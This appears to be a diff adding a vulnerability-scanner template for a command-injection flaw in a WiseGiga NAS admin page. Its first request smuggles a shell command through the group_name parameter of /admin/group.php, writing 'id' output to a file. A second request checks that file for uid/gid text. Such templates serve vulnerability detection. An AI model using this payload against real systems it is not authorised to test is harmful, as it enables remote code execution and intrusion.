@@ -1,0 +1,15 @@
+name: wisegiga-nas-group-php-rce
+set:
+  randstr: randomLowercase(20)
+rules:
+  r0:
+    request:
+      method: GET
+      path: /admin/group.php?memberid=root&cmd=add&group_name=d;id>{{randstr}}.txt
+    expression: response.status == 200 && response.body.bcontains(b'window.open("menu02_02_m.php"')
+  r1:
+    request:
+      method: GET
+      path: /admin/{{randstr}}.txt
+    expression: response.status == 200 &&  "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)".bmatches(response.body)
+expression: r0() && r1()
